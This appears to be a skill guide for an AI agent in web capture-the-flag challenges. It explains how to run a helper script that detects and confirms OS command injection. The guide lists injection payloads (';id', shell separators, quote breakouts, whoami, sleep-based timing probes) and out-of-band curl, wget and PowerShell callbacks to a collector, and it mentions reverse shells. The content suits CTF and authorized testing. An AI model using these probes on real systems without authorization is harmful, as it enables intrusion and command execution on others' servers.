# OS command injection

Read this when JavaScript, HTML, or a live request exposes a scalar field shaped like
`command`, `cmd`, `args`, `options`, `flags`, `host`, `ip`, `domain`, `filename`, `path`,
`binary`, `tool`, or `target`; when a feature plausibly shells out (diagnostics, conversion,
export, archive, media, dice/formula engines); or when a response adds process output or shell
errors. A `COMMAND-INJECTION FIELD SIGNALS` line from `jsmine.py` is a prioritization lead, not
a vulnerability finding.

## Fast track: preserve one valid request

`cmdiquick.py` mutates exactly one explicit location while leaving the rest of a known-valid
request intact. Its default chain is response-only: baseline, a cheap POSIX `;id` fast path, a
literal reflection control, then dialect-specific random markers for POSIX, `cmd.exe`, and
PowerShell across separators, newlines, and single/double-quote breakouts. After confirmation it
reuses the exact winning wrapper for `whoami`; it never guesses the follow-up syntax from `--os`.
It scans response headers and bodies for flags, writes `probes.jsonl` plus `summary.json`, and
saves complete response headers/bodies under `responses/`.

```bash
# JSON, including dotted/list paths such as wrapper[0].rollOptions
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py \
  --url 'https://target/api/roll' --method POST \
  --json '{"dice":[{"type":"d100","count":1}],"rollOptions":"none"}' \
  --field rollOptions --out recon/cmdiquick

# Query string
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py \
  --url 'https://target/ping?host=127.0.0.1' --param host --out recon/cmdiquick

# application/x-www-form-urlencoded
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py \
  --url 'https://target/check' --method POST \
  --form 'host=127.0.0.1&mode=fast' --field host --out recon/cmdiquick

# Duplicate query/form/cookie names use a 1-based occurrence
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py \
  --url 'https://target/check?host=safe&host=127.0.0.1' \
  --param host --occurrence 2 --out recon/cmdiquick

# Path marker: the marker is replaced with the seed for the valid baseline
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py \
  --url 'https://target/tools/ping/*' --path-marker '*' --seed 127.0.0.1 \
  --out recon/cmdiquick

# Header
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py \
  --url 'https://target/process' --header 'X-Diagnostic-Host: 127.0.0.1' \
  --inject-header X-Diagnostic-Host --out recon/cmdiquick

# One cookie value without rebuilding the rest of the Cookie header
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py \
  --url 'https://target/process' --cookie 'session=abc; target=127.0.0.1' \
  --cookie-param target --out recon/cmdiquick
```

Use `--body-file` for XML, `text/plain`, a raw GraphQL document, or another serialized body. Put
the marker at one value and supply the body's real content type:

```bash
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py \
  --url 'https://target/check' --method POST --body-file request.xml \
  --content-type application/xml --marker CMDI_INJECT --seed 127.0.0.1 \
  --out recon/cmdiquick
```

Use a raw Burp-style request for multipart fields/filenames, unusual encodings, or a request whose
ordinary method/target/body structure must be retained. Put a unique marker at the one location to
mutate; `--seed` is substituted for the valid baseline. The helper preserves the request target,
ordinary headers, content type/boundary, and body while recalculating transport headers. It uses
the Requests HTTP stack and is not a byte-for-byte duplicate-header or request-smuggling engine.

```bash
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py \
  --url 'https://target' --request-file request.txt \
  --marker CMDI_INJECT --seed report.txt --out recon/cmdiquick
```

Authentication is supported through `--token`, `--cookie`, and repeatable `--header`. Those
header values are redacted in the request evidence. Run the same known-valid request under every
identity that can reach the feature; an anonymous 401 does not clear an authenticated field.
Use repeatable `--baseline-status` or `--baseline-regex` when a known-valid request intentionally
returns something other than the default 2xx response. `--proxy` and `--verify-tls` are available
when the request must pass through an intercepting proxy or use normal certificate validation.

## Dialects and contexts

`auto` tests three independent command families and retains both the dialect and wrapper that
actually executed:

- POSIX: `printf` markers; `;`, `&&`, `||`, pipe, newline, and quote breakouts; `id`/`whoami`;
  `$()` and backtick substitutions for timing/OOB probes whose output is normally captured.
- Windows `cmd.exe`: a `ver`-gated `echo` marker so POSIX `&echo` cannot masquerade as Windows;
  ampersand/and/or/pipe/CRLF and quote breakouts; `whoami`.
- PowerShell: `$PSVersionTable`-gated `Write-Output`; semicolon/newline and quote breakouts;
  `whoami`; `$()` subexpressions for timing/OOB probes.

Use `--os posix`, `--os windows`, or `--os powershell` when the server environment is already
known. Header/cookie targets omit newline templates because HTTP clients reject embedded newlines
before they can reach an application sink.

## What counts as proof

- `INJECTABLE ... new uid/gid output` is strong in-band proof because a POSIX identity signature
  absent from the baseline appeared only after a separator plus `id`.
- `INJECTABLE ... execution-only marker` requires a random marker to appear for the shell payload
  but not for the literal reflection control. Raw reflection alone is never proof.
- `INJECTABLE ... verified OOB callback` requires that probe's unique nonce to appear in the
  supplied local collector log; merely sending a callback-shaped payload is not confirmation.
- A flag in any response header or body stops the run immediately.
- A new `sh:`, `bash:`, `command not found`, or Windows command error is a strong lead but remains
  `INCONCLUSIVE` without execution output or a repeatable timing differential.
- `429`, gateway failures, authentication/filter blocks, an invalid baseline, and an exhausted
  budget are inconclusive. `summary.json` records `INCONCLUSIVE`, `BLOCKED_OR_FILTERED`,
  `UNTESTED_BUDGET`, or `CIRCUIT_BREAKER`; never rewrite those as “not injectable.”

## Blind timing is explicit

Default probes do not sleep, write files, make callbacks, or open shells. If the response channel
is silent and the endpoint is safe to repeat, opt in to paired timing controls:

```bash
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py ... --blind-time 3
```

The helper sends two unchanged controls, tries each applicable winning-wrapper candidate once, and
only repeats a candidate that crosses the delay threshold. Both delayed requests must exceed both
controls by a substantial fraction of the requested delay. POSIX uses `sleep`, `cmd.exe` uses
`timeout /t`, and PowerShell uses `Start-Sleep`. Keep the delay between two and five seconds unless
the target's normal latency requires more.

When timing is unavailable but an owned HTTP collector is running, verified OOB proof is also
explicit. The helper appends a unique nonce to the callback base and only confirms if that nonce
appears in the collector log:

```bash
python3 ~/.claude/skills/web-ctf/scripts/cmdiquick.py ... \
  --oob-url "$OOB_URL/cmdi" --oob-log oob.log --oob-wait 10
```

OOB payloads use `curl`/`wget`, `curl.exe`, or PowerShell `Invoke-WebRequest` according to the
candidate dialect. File writes and reverse shells stay manual and require a separate reason after
the bounded detector is exhausted.

## Discovery coverage

`jsmine.py` associates command-shaped fields with the same request call when it can:

- direct Axios JSON bodies and `fetch(... body: JSON.stringify({...}))`;
- query parameters and template-literal path variables;
- `URLSearchParams` bodies;
- request headers;
- rendered HTML forms, including multipart forms;
- unresolved `FormData.append()`/`URLSearchParams.append()` fields as lower-confidence leads.

`ctf-init.sh` writes these candidates to `recon/cmdi-signals.txt` and prints helper examples. It
does not automatically inject: malformed bodies can stop before the vulnerable sink, and POSTs
may persist state. Reconstruct a valid request first, change one location, and keep the baseline
response beside the exploit evidence.

## After confirmation

Prefer the smallest response-only command that reaches the objective. Record the original valid
value, exact separator, request location, command output, identity/auth state, and whether the
request changed server state. Do not infer unrestricted shell access from a simulated or
allowlisted command runner; describe only the commands and effects actually demonstrated.
